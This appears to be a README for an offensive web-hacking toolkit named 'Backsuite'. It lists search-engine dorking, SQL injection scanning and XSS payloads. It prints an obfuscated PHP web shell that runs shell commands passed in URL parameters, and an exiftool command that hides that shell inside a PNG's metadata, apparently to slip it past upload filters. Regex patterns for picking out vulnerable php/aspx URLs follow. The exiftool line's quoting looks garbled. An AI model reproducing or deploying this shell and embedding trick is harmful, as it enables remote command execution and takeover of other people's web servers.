 # Backsuite
 
 <ul>
  <li>[ &#x1F608;  ] Dorks with : google.com / yahoo.com / bing.com</li>
  <li>[ &#x1F52D;  ] Scope ending files : <b>php</b> / <b>aspx</b></li>
  <li>[ &#x1F489;  ] Scan : SQL Injection </li>
  <li>[ &#x1F4C4;  ] List of Syntax <I><b>[errors]</b></I> to detect an SQL injection  </li>
  <li>[ &#x274C;  ] Xss payloads   </li>
  <li>[ &#x1F50D;  ] SQL injection - Characters   </li>
</ul>


# Use <TARGET>/file.php?_=system&__=ls -la

SHELL = {`<?php $_="{";$_=($_^"<").($_^">;").($_^"/");?><?=${'_'.$_}["_"](${'_'.$_}["__"]);`}

##### Download <img height="33" width="33" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"><a href="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">Img<a> 

 `exiftool -Comment='exiftool -Comment="<?php $_="{";$_=($_^"<").($_^">;").($_^"/");?><?=${'_'.$_}["_"](${'_'.$_}["__"]); __halt_compiler();' googleg_standard_color_128dp.png`
<hr>

###### Scope : only view x.php?x=x | and | x.aspx?x=x
`([.]+[aspxh]{3,4}[?]{1,1}[a-zA-Z0-9_-]{1,10}[=]{1,1})` 

###### Scope : only view ALL LINKS x.x?x= | x/x?x | /?x=x
`([?]{1,1}[a-zA-Z0-9\-_=]{1,10})`

###### Scope : only view x.php?x=x | and | x.aspx?x=x | and | x.php/aspx?x
`([.]+[aspxh]{3,4}[a-zA-Z0-9-\_.=?&]{1,50})`

###### Scope : only view x.php/aspx?x=x | x.php/aspx
`([.]+[aspxh]{3,4})`

###### Scope : view all / | x.php/aspx | x.php/aspx?x=x | /?x=x
`([a-z_.-][?-][a-z0-9+$%_.-])?`
